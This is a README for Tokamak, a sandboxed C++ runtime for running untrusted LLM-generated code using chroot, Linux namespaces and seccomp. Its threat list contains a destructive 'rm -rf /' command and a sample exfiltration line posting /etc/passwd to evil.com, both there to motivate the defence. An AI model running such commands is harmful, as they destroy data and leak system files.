# Tokamak: Secure AI Code Execution Runtime

> **"Containment for the Unstable."**

Tokamak is a high-performance, sandboxed execution environment designed to safely run untrusted code generated by Large Language Models (LLMs). It uses Linux kernel primitives to create a "Vacuum" (isolated environment) that prevents AI agents from accessing the host filesystem or unauthorized network resources.

## The Problem: AI Safety

LLM Agents (like ChatGPT's Code Interpreter or open-source equivalents) often need to execute code to solve problems. Running this code directly on a host machine allows for:
- **Filesystem Deletion:** `rm -rf /`
- **Data Exfiltration:** `curl -X POST evil.com --data @/etc/passwd`
- **Resource Exhaustion:** Fork bombs and infinite loops.

## The Solution: Tokamak Architecture

Tokamak treats untrusted code as **"Plasma"**—highly useful matter that must be strictly contained within a magnetic field.

### Component Overview

| Component | Systems Implementation |
|-----------|------------------------|
| **Reactor** | C++ Host Process (Parent) |
| **Vacuum** | `chroot` + Alpine Linux RootFS |
| **Plasma** | Untrusted Child Process (`fork` + `exec`) |
| **Field** | Linux Namespaces (`unshare`) & Seccomp-BPF |

## Usage

### Prerequisites

- Linux Kernel 5.4+ (or WSL2/OrbStack on Mac)
- `g++`, `make`, `wget`

### Build & Ignition

1. **Initialize the Vacuum Chamber** (Download RootFS):
   ```bash
   ./setup.sh
    ```

2. **Compile the Reactor**:
    ```bash
    g++ -o reactor reactor.cpp
    ```

3. **Inject Plasma** (Run a command safely):
    ```bash
    # Requires root for chroot/namespaces
    sudo ./reactor /bin/ls -la /
    ```

## Roadmap

### Phase 1: The "Iron Box" (Systems & Security Core)

**Goal:** Build a secure C++ runtime that isolates the process using raw Linux primitives.

- [x] **Process Isolation:** Implement `fork()` and `execvp()` to separate the Reactor from Plasma.
- [x] **Filesystem Locking:** Implement `chroot()` to restrict file access to the Vacuum (Alpine RootFS).
- [ ] **Network Isolation:** Use `unshare(CLONE_NEWNET)` to create a disconnected network namespace (The Air Gap).
- [ ] **System Call Filtering:** Implement `seccomp-bpf` to whitelist only safe syscalls (`read`, `write`, `exit`) and block dangerous ones (`socket`, `fork`).

### Phase 2: The "Speed Demon" (Performance)

**Goal:** Optimize cold-start latency for real-time AI usage (<20ms start time).

- [ ] **Zygote Pattern:** Implement a pre-forked "Template" process with Python libraries loaded.
- [ ] **Copy-on-Write:** Use `fork()` to instantly spawn workers from the Zygote without initialization overhead.

### Phase 3: The "Brain" (AI Integration)

**Goal:** Connect the runtime to an actual LLM Agent.

- [ ] **API Layer:** Build a FastAPI/Go wrapper to accept code execution requests over HTTP.
- [ ] **Agent Integration:** Create a Python LLM Agent (OpenAI/Gemini) with a `execute_python` tool definition.
- [ ] **Resource Monitoring:** Return stdout, stderr, and memory usage in the API response.

### Phase 4: The "Fleet" (Scalability)

**Goal:** Production-readiness and multi-tenancy.

- [ ] **Concurrency:** Implement a Worker Pool to manage multiple simultaneous sandboxes.
- [ ] **Observability:** specific Prometheus metrics for execution time and security violations.
- [ ] **Resource Limits:** Apply `cgroups` (Control Groups) to limit RAM and CPU usage per sandbox.

## License

MIT License © 2026 Jae Hyuk Jung
